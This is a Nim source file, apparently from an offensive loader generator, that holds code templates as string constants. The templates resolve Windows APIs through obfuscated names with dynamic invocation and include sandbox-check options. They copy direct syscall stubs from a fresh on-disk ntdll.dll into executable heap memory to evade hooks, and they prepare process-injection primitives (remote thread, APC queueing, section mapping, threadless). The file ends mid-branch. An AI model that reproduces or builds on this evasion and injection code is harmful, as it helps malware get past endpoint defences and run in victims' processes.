
let DInvokeBaseStub * = """

const
  KERNEL32_DLL* = obf("kernel32.dll")

type
  #GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
  VirtualAllocEx_t* = proc (hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
  VirtualProtect_t* = proc (lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
  GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
  GetProcAddress_t* = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
  RtlAddVectoredExceptionHandler_t* = proc (First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER): PVOID {.stdcall.}
  GetModuleHandleA_t* = proc (lpModuleName: LPCSTR): HMODULE {.stdcall.}
  GetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
  SetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
  CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
  OpenThread_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwThreadId: DWORD): HANDLE {.stdcall.}
  GetCurrentThreadId_t* = proc (): DWORD {.stdcall.}
  WaitForSingleObject_t* = proc (hHandle: HANDLE, dwMilliseconds: DWORD): DWORD {.stdcall.}
  MultiByteToWideChar_t* = proc (CodePage: UINT, dwFlags: DWORD, lpMultiByteStr: LPCSTR, cbMultiByte: cint, lpWideCharStr: LPWSTR, cchWideChar: cint): cint {.cdecl,stdcall.}
  Sleep_t* = proc (dwMilliseconds: DWORD): DWORD {.stdcall.}
when not defined(SkipDefaultSandBoxChecks):
  type  GetTickCount_t* = proc (): DWORD {.stdcall.}

const
  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
  VirtualAllocEx_HASH * = obf("VirtualAllocEx")
  #GetCurrentProcess_HASH * = obf("GetCurrentProcess")
  OpenProcess_HASH * = obf("OpenProcess")
  VirtualProtect_HASH * = obf("VirtualProtect")
  GetProcessHeap_HASH * = obf("GetProcessHeap")
  GetProcAddress_HASH * = obf("GetProcAddress")
  RtlAddVectoredExceptionHandler_HASH * = obf("RtlAddVectoredExceptionHandler")
  GetModuleHandleA_HASH * = obf("GetModuleHandleA")
  GetThreadContext_HASH * = obf("GetThreadContext")
  SetThreadContext_HASH * = obf("SetThreadContext")
  CloseHandle_HASH * = obf("CloseHandle")
  OpenThread_HASH * = obf("OpenThread")
  GetCurrentThreadId_HASH * = obf("GetCurrentThreadId")
  WaitForSingleObject_HASH * = obf("WaitForSingleObject")
  MultiByteToWideChar_HASH * = obf("MultiByteToWideChar")
  Sleep_HASH * = obf("Sleep")
when not defined(SkipDefaultSandBoxChecks):
  const  GetTickCount_HASH * = obf("GetTickCount")

#var MyGetCurrentProcess*: GetCurrentProcess_t
var MyVirtualAllocEx*: VirtualAllocEx_t
var MyGetCurrentProcessId*: GetCurrentProcessId_t
var MyOpenProcess*: OpenProcess_t
var MyVirtualProtect*: VirtualProtect_t
var MyGetProcessHeap*: GetProcessHeap_t
var MyGetProcAddress*: GetProcAddress_t
var MyRtlAddVectoredExceptionHandler*: RtlAddVectoredExceptionHandler_t
var MyGetModuleHandleA*: GetModuleHandleA_t
var MyGetThreadContext*: GetThreadContext_t
var MySetThreadContext*: SetThreadContext_t
var MyCloseHandle*: CloseHandle_t
var MyOpenThread*: OpenThread_t
var MyGetCurrentThreadId*: GetCurrentThreadId_t
var MyWaitForSingleObject*: WaitForSingleObject_t
var MultiByteToWideChar*: MultiByteToWideChar_t
var MySleep*: Sleep_t
when not defined(SkipDefaultSandBoxChecks):
  var MyGetTickCount*: GetTickCount_t


#MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))

MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))

MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))

MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))

MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))

MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))

MyRtlAddVectoredExceptionHandler = cast[RtlAddVectoredExceptionHandler_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlAddVectoredExceptionHandler_HASH, 0, TRUE)))

MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))

MyGetThreadContext = cast[GetThreadContext_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetThreadContext_HASH, 0, FALSE)))

MySetThreadContext = cast[SetThreadContext_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), SetThreadContext_HASH, 0, FALSE)))

MyCloseHandle = cast[CloseHandle_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CloseHandle_HASH, 0, FALSE)))

MyOpenThread = cast[OpenThread_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenThread_HASH, 0, FALSE)))

MyGetCurrentThreadId = cast[GetCurrentThreadId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentThreadId_HASH, 0, FALSE)))

MyWaitForSingleObject = cast[WaitForSingleObject_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), WaitForSingleObject_HASH, 0, FALSE)))

MultiByteToWideChar = cast[MultiByteToWideChar_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MultiByteToWideChar_HASH, 0, FALSE)))

MySleep = cast[Sleep_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), Sleep_HASH, 0, FALSE)))

when not defined(SkipDefaultSandBoxChecks):
  MyGetTickCount = cast[GetTickCount_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetTickCount_HASH, 0, FALSE)))
        
"""

let DInvokeLoadLibraryAGetProcAddress * = """

type
  LoadLibraryA_t = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
  #GetProcAddress_t = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
  
const
  LoadLibraryA_HASH  = obf("LoadLibraryA")
  #GetProcAddress_HASH  = obf("GetProcAddress")
  
var MyLoadLibraryA: LoadLibraryA_t
#var MyGetProcAddress: GetProcAddress_t

MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))

#MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))



"""

let GetSyscallStub * = """

when defined(GetSyscallStub):
    type
      PS_ATTR_UNION* {.pure, union.} = object
        Value*: ULONG
        ValuePtr*: PVOID
      PS_ATTRIBUTE* {.pure.} = object
        Attribute*: ULONG 
        Size*: SIZE_T
        u1*: PS_ATTR_UNION
        ReturnLength*: PSIZE_T
      PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
      PS_ATTRIBUTE_LIST* {.pure.} = object
        TotalLength*: SIZE_T
        Attributes*: array[2, PS_ATTRIBUTE]
      PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST

    
    var 
        SYSCALL_STUB_SIZE: int = 23

    # Unmanaged NTDLL Declarations

    type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
    var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}

    type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}

    var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}

    type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

    var NtCreateThreadEx: myNtCreateThreadEx

    type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
    
    type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
    
    var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

    type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

    var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

    type myNtCreateSection = proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}

    var NtCreateSection: proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}

    type myNtMapViewOfSection = proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}

    var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
    
    type myNtFreeVirtualMemory = proc(ProcessHandle: HANDLE; BaseAddress: PVOID; RegionSize: PSIZE_T; FreeType: ULONG): NTSTATUS {.stdcall.}

    var NtFreeVirtualMemory: proc(ProcessHandle: HANDLE; BaseAddress: PVOID; RegionSize: PSIZE_T; FreeType: ULONG): NTSTATUS {.stdcall.}

    type myNtReadVirtualMemory = proc(ProcessHandle: HANDLE; BaseAddress: PVOID; Buffer: PVOID; NumberOfBytesToRead: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS {.stdcall.}

    var NtReadVirtualMemory: proc(ProcessHandle: HANDLE; BaseAddress: PVOID; Buffer: PVOID; NumberOfBytesToRead: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS {.stdcall.}

    when defined(QueueAPC):
      type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
      var NtQueueApcThread: proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}

      type myNtAlertResumeThread = proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}
      var NtAlertResumeThread: proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}

      type myNtOpenThread = proc(ThreadHandle: PHANDLE; DesiredAccess: ACCESS_MASK; ObjectAttributes: POBJECT_ATTRIBUTES; ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
      var NtOpenThread: proc(ThreadHandle: PHANDLE; DesiredAccess: ACCESS_MASK; ObjectAttributes: POBJECT_ATTRIBUTES; ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
      
      type myNtResumeThread = proc(ThreadHandle: HANDLE; SuspendCount: PULONG): NTSTATUS {.stdcall.}
      var NtResumeThread: proc(ThreadHandle: HANDLE; SuspendCount: PULONG): NTSTATUS {.stdcall.}

      type myNtTestAlert = proc(): NTSTATUS {.stdcall.}
      var NtTestAlert: proc(): NTSTATUS {.stdcall.}
    
    type
      CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
      GetFileSize_t* = proc (hFile: HANDLE, lpFileSizeHigh: LPDWORD): DWORD {.stdcall.}
      RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
      ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
      
    const
      CreateFileA_HASH * = obf("CreateFileA")
      GetFileSize_HASH * = obf("GetFileSize")
      RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
      ReadFile_HASH * = obf("ReadFile")
    when defined(DInvoke):  
        var MyCreateFileA*: CreateFileA_t
        var MyGetFileSize*: GetFileSize_t
        var MyRtlAllocateHeap*: RtlAllocateHeap_t
        var MyReadFile*: ReadFile_t
    
    when defined(DInvoke):
        MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
        MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
        MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
        MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))
    
    proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
        return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
    
    proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
        var
            file: HANDLE
            fileSize: DWORD
            bytesRead: DWORD
            fileData: PVOID
            ntdllString: LPCSTR
            nullHandle: HANDLE
        when defined(wow64):
            ntdllString = obf("C:\\windows\\syswow64\\ntdll.dll")
        else:
            ntdllString = obf("C:\\windows\\system32\\ntdll.dll")
        when defined(DInvoke):
            file = MyCreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
            when defined(verbose):
                echo obf("[*] CreateFileA Error Code: ") & $[GetLastError()]
            fileSize = MyGetFileSize(file, nil)
            when defined(verbose):
                echo obf("[*] MyGetFileSize Error Code: ") & $[GetLastError()]
            if (ws2k12):
                fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
            else:
                fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
            when defined(verbose):
                echo obf("[*] MyRtlAllocateHeap Error Code: ") & $[GetLastError()]
            let success = MyReadFile(file, fileData, fileSize, addr bytesRead, nil)
            when defined(verbose):
                echo obf("[*] MyReadFile Error Code: ") & $[GetLastError()]
                if (success):
                    echo obf("[*] MyReadFile Success")
                else:
                    echo obf("[*] MyReadFile Failed")
        else:
            file = CreateFileA(ntdllString, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullHandle)
            fileSize = GetFileSize(file, nil)
            fileData = RtlAllocateHeap(cast[PVOID](GetProcessHeap()), 0, cast[SIZE_T](fileSize))
            let success = ReadFile(file, fileData, fileSize, addr bytesRead, nil)
        var
            dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
            imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
            exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
            section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
            textSection: PIMAGE_SECTION_HEADER = section
            rdataSection: PIMAGE_SECTION_HEADER = section
    
        let low: uint16 = 0
    
        for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
            var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
            if obf(".rdata") in toString(ntdllSectionHeader.Name):
                rdataSection = ntdllSectionHeader
            
        var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))
    
        var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
        var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
        var stubFound: BOOL = 0
        var oldProtection: DWORD = 0
        let low2: int = 0
        for low2 in 0 ..< exportDirectory.NumberOfNames:
            var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
            var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
            var functionNameResolved: cstring = cast[cstring](functionNameVA)
            if (functionNameResolved == functionName):
                if(ws2k12):
                    # We adjust the functionVA by 7, as for some reason the functionVA is 7 ordinals off compared ntdll from disk to memory
                    functionNameVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2 + 7], rdataSection))
                    functionVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 8], textSection))
                moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
                stubFound = 1
        return stubFound

"""


let RetrieveSyscallStubs * = """


    var hProcess: HANDLE
    
    when defined(DInvoke):
        hProcess = -1

        var pHandle2: HANDLE = -1
        var syscallStub_NtProtect: LPVOID

        #MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
        #syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
        # This can not be used here, as it results in strange behaviours. Maybe due to too many syscall stubs for the heap.
        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
        syscallStub_NtProtect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
    else:
        hProcess = -1
        var pHandle2: HANDLE = -1
        var syscallStub_NtProtect: LPVOID
        #syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
        syscallStub_NtProtect = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)


    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (2 * cast[HANDLE](SYSCALL_STUB_SIZE))
    
    var oldProtection: DWORD = 0
    
    # Define NtProtectVirtualMemory
    NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
    # define NtWriteVirtualMemory
    NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
    # define NtAllocateVirtualMemory
    NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))    
    
    
    var syssuccess = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtProtectVirtualMemory: ") & $syssuccess
    syssuccess = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtWriteVirtualMemory: ") & $syssuccess
    syssuccess = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtAllocateVirtualMemory: ") & $syssuccess
    
    var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (7 * cast[HANDLE](SYSCALL_STUB_SIZE))
    # define NtClose
    NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
    syssuccess = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
    when defined(verbose):
        echo obf("[*] GetSyscallStub NtClose: ") & $syssuccess

    when defined(LocalCreateThread):
        var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
        NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
        syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess
    
    when defined(remoteMapSection):
        var syscallStub_NtCreateSection: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (4 * cast[HANDLE](SYSCALL_STUB_SIZE))
        var syscallStub_NtMapViewOfSection: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (5 * cast[HANDLE](SYSCALL_STUB_SIZE))
        # define NtCreateSection
        NtCreateSection = cast[myNtCreateSection](cast[LPVOID](syscallStub_NtCreateSection))
        syssuccess = GetSyscallStub(obf("NtCreateSection"), cast[LPVOID](syscallStub_NtCreateSection))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtCreateSection: ") & $syssuccess

        # define NtMapViewOfSection
        NtMapViewOfSection = cast[myNtMapViewOfSection](cast[LPVOID](syscallStub_NtMapViewOfSection))
        syssuccess = GetSyscallStub(obf("NtMapViewOfSection"), cast[LPVOID](syscallStub_NtMapViewOfSection))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtMapViewOfSection: ") & $syssuccess



    when defined(remoteinject):
        var syscallStub_NtOpenP: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (6 * cast[HANDLE](SYSCALL_STUB_SIZE))
        # define NtOpenProcess
        var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
        
        syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtOpenProcess: ") & $syssuccess

        var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
        NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
        syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess

    when defined(QueueAPC):
        var syscallStub_NtQueueApcThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (8 * cast[HANDLE](SYSCALL_STUB_SIZE))
        var syscallStub_NtAlertResumeThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (9 * cast[HANDLE](SYSCALL_STUB_SIZE))
        # define NtQueueApcThread
        NtQueueApcThread = cast[myNtQueueApcThread](cast[LPVOID](syscallStub_NtQueueApcThread))
        # define NtAlertResumeThread
        NtAlertResumeThread = cast[myNtAlertResumeThread](cast[LPVOID](syscallStub_NtAlertResumeThread))

        var syscallStub_NtTestAlert: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (10 * cast[HANDLE](SYSCALL_STUB_SIZE))
        # define NtTestAlert
        NtTestAlert = cast[myNtTestAlert](cast[LPVOID](syscallStub_NtTestAlert))
        
        var syscallStub_NtOpenThread: HANDLE = cast[HANDLE](cast[LPVOID](syscallStub_NtProtect) + (11 * cast[HANDLE](SYSCALL_STUB_SIZE)))
        # define NtOpenThread
        NtOpenThread = cast[myNtOpenThread](cast[LPVOID](syscallStub_NtOpenThread))

        var syscallStub_NtResumeThread: HANDLE = cast[HANDLE](cast[LPVOID](syscallStub_NtProtect) + (12 * cast[HANDLE](SYSCALL_STUB_SIZE)))
        # define NtResumeThread
        NtResumeThread = cast[myNtResumeThread](cast[LPVOID](syscallStub_NtResumeThread))


        syssuccess = GetSyscallStub(obf("NtQueueApcThread"), cast[LPVOID](syscallStub_NtQueueApcThread))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtQueueApcThread: ") & $syssuccess
        
        syssuccess = GetSyscallStub(obf("NtAlertResumeThread"), cast[LPVOID](syscallStub_NtAlertResumeThread))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtAlertResumeThread: ") & $syssuccess
          
        syssuccess = GetSyscallStub(obf("NtTestAlert"), cast[LPVOID](syscallStub_NtTestAlert))
        when defined(verbose):
            echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess

    when defined(threadless):
      # get NtFreeVirtualMemory and NtReadVirtualMemory
      var syscallStub_NtFreeVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (13 * cast[HANDLE](SYSCALL_STUB_SIZE))
      var syscallStub_NtReadVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (14 * cast[HANDLE](SYSCALL_STUB_SIZE))
      # define NtFreeVirtualMemory
      NtFreeVirtualMemory = cast[myNtFreeVirtualMemory](cast[LPVOID](syscallStub_NtFreeVirtualMemory))
      # define NtReadVirtualMemory
      NtReadVirtualMemory = cast[myNtReadVirtualMemory](cast[LPVOID](syscallStub_NtReadVirtualMemory))
      syssuccess = GetSyscallStub(obf("NtFreeVirtualMemory"), cast[LPVOID](syscallStub_NtFreeVirtualMemory))
      when defined(verbose):
          echo obf("[*] GetSyscallStub NtFreeVirtualMemory: ") & $syssuccess
      syssuccess = GetSyscallStub(obf("NtReadVirtualMemory"), cast[LPVOID](syscallStub_NtReadVirtualMemory))
      when defined(verbose):
          echo obf("[*] GetSyscallStub NtReadVirtualMemory: ") & $syssuccess

    when defined(DInvoke):
      when defined(verbose):
        echo obf("[*] Setting page protection")
      discard MyVirtualProtect(syscallStub_NtProtect, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
      when defined(verbose):
        echo obf("[*] Done")
    else:
